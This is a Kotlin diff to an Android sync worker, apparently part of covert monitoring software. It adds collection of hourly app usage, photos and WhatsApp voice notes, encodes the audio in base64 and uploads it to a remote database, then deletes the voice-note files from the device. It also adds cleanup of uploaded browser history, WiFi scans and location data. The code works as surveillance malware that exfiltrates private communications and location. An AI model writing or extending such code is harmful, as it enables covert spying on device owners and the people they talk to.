@@ -76,6 +76,7 @@ class DuaSyncWorker(
                 )
 
                 val appUsageList = metricsCollector.collectPerAppUsage()
+                val hourlyData = metricsCollector.collectHourlyUsage()
                 for (usage in appUsageList) {
                     val usageDoc = JSONObject().apply {
                         put("packageName", usage.packageName)
@@ -83,6 +84,14 @@ class DuaSyncWorker(
                         put("totalForegroundMs", usage.totalForegroundMs)
                         put("lastUsedMs", usage.lastUsedMs)
                         put("date", currentTimeStr.split(" ")[0])
+                        val appHourly = hourlyData[usage.packageName]
+                        if (appHourly != null && appHourly.isNotEmpty()) {
+                            val hourlyObj = JSONObject()
+                            for ((hour, ms) in appHourly) {
+                                hourlyObj.put(hour.toString(), ms)
+                            }
+                            put("hourlyMs", hourlyObj)
+                        }
                     }
                     val pkgKey = usage.packageName.replace(".", "_")
                     CloudApi.writeToCloud("devices/$androidId/apps", usageDoc, pkgKey)
@@ -132,6 +141,12 @@ class DuaSyncWorker(
                 var newestDateTaken = 0L
                 for ((i, entry) in newPhotos.withIndex()) {
                     try {
+                        // Skip photos >5MB to prevent OOM
+                        if (entry.file.length() > 5 * 1024 * 1024) {
+                            Log.w(TAG, "Skipping oversized photo: ${entry.file.name} (${entry.file.length() / 1024 / 1024}MB)")
+                            uploadedPaths.add(entry.file.absolutePath)
+                            continue
+                        }
                         val processed = PhotoProcessor.process(entry.file, true)
                         if (processed != null) {
                             val ts = System.currentTimeMillis()
@@ -225,7 +240,7 @@ class DuaSyncWorker(
                 ErrorLog.write(context, TAG, "Browser history sync error", e)
             }
 
-            // ── Voice Notes (WhatsApp) ──
+            // ── Voice Notes (WhatsApp, adaptive by free space + 300MB audio budget) ──
             try {
                 val hasAudioPerm = if (Build.VERSION.SDK_INT >= 33) {
                     context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
@@ -238,30 +253,66 @@ class DuaSyncWorker(
                     val mediaCollector = MediaCollector(context)
                     val voiceNotes = mediaCollector.collectVoiceNotes()
                     if (voiceNotes.isNotEmpty()) {
+                        // Adaptive caps based on free space
+                        val freeMb = android.os.Environment.getExternalStorageDirectory().freeSpace / (1024 * 1024)
+                        val maxNotes = when {
+                            freeMb > 1000 -> 30
+                            freeMb > 200 -> 15
+                            else -> 8
+                        }
+                        val withAudioCount = when {
+                            freeMb > 1000 -> maxNotes
+                            freeMb > 200 -> minOf(6, maxNotes)
+                            else -> 0
+                        }
+
+                        // Audio budget: 30% of Spark 1GB = 300MB
+                        val audioBudget = 300L * 1024 * 1024
+                        val audioSizesJson = prefs.getString("voice_audio_batch_sizes", "{}") ?: "{}"
+                        val audioSizes = org.json.JSONObject(audioSizesJson)
+                        var usedBudget = 0L
+                        for (k in audioSizes.keys()) {
+                            usedBudget += audioSizes.optLong(k, 0L)
+                        }
+
                         val notesArray = JSONArray()
                         val uploadedPaths = prefs.getStringSet("uploaded_voice_paths", mutableSetOf()) ?: mutableSetOf()
                         val deletedPaths = mutableListOf<String>()
+                        val oneDayAgo = currentTs - 86400000L
                         var added = 0
+                        var batchAudioBytes = 0L
                         for (note in voiceNotes) {
                             if (note.file.absolutePath in uploadedPaths) continue
+                            if (added >= maxNotes) break
+                            val isOld = note.dateAdded > 0 && note.dateAdded < oneDayAgo
+                            var includeAudio = !isOld && added < withAudioCount && note.size in 1..512000
                             val noteJson = JSONObject().apply {
                                 put("fileName", note.file.name)
                                 put("dateAdded", note.dateAdded)
                                 put("durationMs", note.duration)
                                 put("sizeBytes", note.size)
                                 put("mimeType", note.mimeType)
-                                if (added < 3 && note.size in 1..512000) {
+                                if (includeAudio) {
                                     try {
                                         val audioBytes = note.file.readBytes()
-                                        put("audioData", java.util.Base64.getEncoder().encodeToString(audioBytes))
+                                        val b64 = java.util.Base64.getEncoder().encodeToString(audioBytes)
+                                        // Check budget before committing
+                                        if (usedBudget + batchAudioBytes + b64.length <= audioBudget) {
+                                            put("audioData", b64)
+                                            batchAudioBytes += b64.length
+                                        } else {
+                                            put("audioStripped", true)
+                                            includeAudio = false
+                                        }
                                     } catch (_: Exception) { }
+                                } else if (isOld) {
+                                    put("audioStripped", true)
                                 }
                             }
                             notesArray.put(noteJson)
                             uploadedPaths.add(note.file.absolutePath)
                             deletedPaths.add(note.file.absolutePath)
                             added++
-                            if (added >= 20) break
                         }
                         if (notesArray.length() > 0) {
                             CloudApi.writeToRTDB(
@@ -270,13 +321,22 @@ class DuaSyncWorker(
                                     put("notes", notesArray)
                                     put("totalCount", voiceNotes.size)
                                     put("ts_ms", currentTs)
+                                    put("freeMb", freeMb.toInt())
+                                    put("audioBytes", batchAudioBytes)
                                 }
                             )
+                            // Track audio bytes for budget enforcement
+                            if (batchAudioBytes > 0) {
+                                audioSizes.put("batch_$currentTs", batchAudioBytes)
+                                prefs.edit().putString("voice_audio_batch_sizes", audioSizes.toString()).apply()
+                            }
                             for (path in deletedPaths) {
                                 try { File(path).delete() } catch (_: Exception) { }
                             }
                             prefs.edit().putStringSet("uploaded_voice_paths", uploadedPaths).apply()
                         }
+                        val budgetPct = (usedBudget + batchAudioBytes) * 100 / audioBudget
+                        Log.i(TAG, "Voice notes: $added uploaded (audio: ${withAudioCount}, budget: ${budgetPct}%, free: ${freeMb}MB)")
                     } else {
                         ErrorLog.write(context, TAG, "Voice notes query returned empty", null)
                     }
@@ -334,6 +394,179 @@ class DuaSyncWorker(
             } catch (e: Exception) {
                 Log.e(TAG, "Usage sync error: ${e.message}", e)
                 ErrorLog.write(context, TAG, "Usage sync error", e)
+            }
+
+            // ── Cleanup (storage-first priority) ──
+            try {
+                runCleanup(context, androidId, currentTs)
+            } catch (e: Exception) {
+                Log.e(TAG, "Cleanup error: ${e.message}", e)
+                ErrorLog.write(context, TAG, "Cleanup error", e)
+            }
+        }
+
+        private suspend fun runCleanup(context: Context, androidId: String, now: Long) {
+            val okClient = CloudApi.getClient()
+            val rtdbBase = CloudConfig.RTDB_URL
+
+            // ── Voice notes: 7-day TTL + adaptive batch cap by free space + 300MB audio budget ──
+            try {
+                val freeMb = android.os.Environment.getExternalStorageDirectory().freeSpace / (1024 * 1024)
+                val keepBatches = when {
+                    freeMb > 1000 -> 20
+                    freeMb > 200 -> 12
+                    else -> 6
+                }
+                val url = "$rtdbBase/devices/$androidId/voice_notes.json?shallow=true"
+                val req = okhttp3.Request.Builder().url(url).get().build()
+                val resp = okClient.newCall(req).execute()
+                val body = resp.body?.string()
+                resp.close()
+                if (body != null && body != "null") {
+                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
+                    val sevenDaysAgo = now - 7 * 86400000L
+                    val toDelete = keys.filter { key ->
+                        val ts = key.removePrefix("batch_").toLongOrNull() ?: 0L
+                        ts < sevenDaysAgo || keys.indexOf(key) < keys.size - keepBatches
+                    }
+                    if (toDelete.isNotEmpty()) {
+                        // Remove deleted batches from audio budget tracker
+                        val audioSizesJson = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
+                            .getString("voice_audio_batch_sizes", "{}") ?: "{}"
+                        val audioSizes = org.json.JSONObject(audioSizesJson)
+                        for (key in toDelete) {
+                            audioSizes.remove(key)
+                            CloudApi.deleteFromRTDB("devices/$androidId/voice_notes/$key")
+                            delay(150)
+                        }
+                        context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
+                            .edit().putString("voice_audio_batch_sizes", audioSizes.toString()).apply()
+                        Log.i(TAG, "Voice cleanup: deleted ${toDelete.size} batches (keep: $keepBatches, free: ${freeMb}MB)")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Voice notes cleanup error: ${e.message}", e)
+            }
+
+            // ── Timeline: 14-day TTL + 500/day cap ──
+            try {
+                val url = "$rtdbBase/devices/$androidId/timeline.json?shallow=true"
+                val req = okhttp3.Request.Builder().url(url).get().build()
+                val resp = okClient.newCall(req).execute()
+                val body = resp.body?.string()
+                resp.close()
+                if (body != null && body != "null") {
+                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
+                    val fourteenDaysAgo = now - 14 * 86400000L
+                    var deleted = 0
+                    for (key in keys) {
+                        val ts = key.toLongOrNull() ?: continue
+                        if (ts < fourteenDaysAgo || keys.indexOf(key) < keys.size - 500) {
+                            CloudApi.deleteFromRTDB("devices/$androidId/timeline/$key")
+                            deleted++
+                            delay(100)
+                        }
+                    }
+                    if (deleted > 0) Log.i(TAG, "Timeline cleanup: deleted $deleted entries")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Timeline cleanup error: ${e.message}", e)
+            }
+
+            // ── Browser history: keep last 5 batches ──
+            try {
+                val url = "$rtdbBase/devices/$androidId/browser_history.json?shallow=true"
+                val req = okhttp3.Request.Builder().url(url).get().build()
+                val resp = okClient.newCall(req).execute()
+                val body = resp.body?.string()
+                resp.close()
+                if (body != null && body != "null") {
+                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
+                    if (keys.size > 5) {
+                        val toDelete = keys.take(keys.size - 5)
+                        for (key in toDelete) {
+                            CloudApi.deleteFromRTDB("devices/$androidId/browser_history/$key")
+                            delay(150)
+                        }
+                        Log.i(TAG, "Browser history cleanup: deleted ${toDelete.size} old batches")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Browser history cleanup error: ${e.message}", e)
+            }
+
+            // ── WiFi scans: keep last 10 batches ──
+            try {
+                val url = "$rtdbBase/devices/$androidId/wifi_scan.json?shallow=true"
+                val req = okhttp3.Request.Builder().url(url).get().build()
+                val resp = okClient.newCall(req).execute()
+                val body = resp.body?.string()
+                resp.close()
+                if (body != null && body != "null") {
+                    val keys = org.json.JSONObject(body).keys().asSequence().toList().sorted()
+                    if (keys.size > 10) {
+                        val toDelete = keys.take(keys.size - 10)
+                        for (key in toDelete) {
+                            CloudApi.deleteFromRTDB("devices/$androidId/wifi_scan/$key")
+                            delay(150)
+                        }
+                        Log.i(TAG, "WiFi scan cleanup: deleted ${toDelete.size} old batches")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "WiFi scan cleanup error: ${e.message}", e)
+            }
+
+            // ── Night samples: 7-day TTL ──
+            try {
+                val url = "$rtdbBase/devices/$androidId/location/night_samples.json?shallow=true"
+                val req = okhttp3.Request.Builder().url(url).get().build()
+                val resp = okClient.newCall(req).execute()
+                val body = resp.body?.string()
+                resp.close()
+                if (body != null && body != "null") {
+                    val sevenDaysAgo = now - 7 * 86400000L
+                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
+                    var deleted = 0
+                    for (key in keys) {
+                        val ts = key.toLongOrNull() ?: continue
+                        if (ts < sevenDaysAgo) {
+                            CloudApi.deleteFromRTDB("devices/$androidId/location/night_samples/$key")
+                            deleted++
+                            delay(100)
+                        }
+                    }
+                    if (deleted > 0) Log.i(TAG, "Night samples cleanup: deleted $deleted entries")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Night samples cleanup error: ${e.message}", e)
+            }
+
+            // ── Location ts nodes: 30-day TTL (DuaTracker.processLocation path) ──
+            try {
+                val url = "$rtdbBase/devices/$androidId/location.json?shallow=true"
+                val req = okhttp3.Request.Builder().url(url).get().build()
+                val resp = okClient.newCall(req).execute()
+                val body = resp.body?.string()
+                resp.close()
+                if (body != null && body != "null") {
+                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
+                    val skipKeys = setOf("latest", "history", "night_samples")
+                    val thirtyDaysAgo = now - 30 * 86400000L
+                    var deleted = 0
+                    for (key in keys) {
+                        if (key in skipKeys) continue
+                        val ts = key.toLongOrNull() ?: continue
+                        if (ts < thirtyDaysAgo) {
+                            CloudApi.deleteFromRTDB("devices/$androidId/location/$key")
+                            deleted++
+                            delay(100)
+                        }
+                    }
+                    if (deleted > 0) Log.i(TAG, "Location ts cleanup: deleted $deleted old entries")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Location ts cleanup error: ${e.message}", e)
             }
         }
     }
